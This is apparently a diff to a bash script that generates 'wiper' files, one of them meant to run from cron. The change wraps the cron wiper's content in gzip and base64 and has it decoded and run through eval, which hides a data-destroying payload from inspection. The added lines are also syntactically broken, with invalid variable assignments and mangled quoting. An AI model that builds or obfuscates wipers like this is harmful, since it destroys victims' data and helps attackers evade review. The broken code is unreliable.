@@ -84,16 +84,16 @@ if [[ "$1" = "wiper" || "$1" = "cronwiper" ]]; then
 
     if [[ "$1" = "wiper" ]]; then
 
-        echo "$content" > ".wiper"
-        echo -e "\n\n$loop_template" >> ".wiper"
+        echo -e "$content\n\n$loop_template" > ".wiper"
+        #echo -e "\n\n$loop_template" >> ".wiper"
 
         echo -e "\n\nWiper created successfully."
         exit
 
     elif [[ "$1" = "cronwiper" ]]; then
-        echo "$content" > ".cron_wiper"
-        echo -e "\n\nact" >> ".cron_wiper"
-
+        $encoded=$(printf "%s" "$content\n\nact" | gzip -c | base64)
+        $encoded="printf "%s" "$encoded" | base64 -d | gunzip -c | eval;"
+        $encoded > ".cron_wiper"        
         echo -e "\n\nCron Wiper created successfully."
         exit
     fi
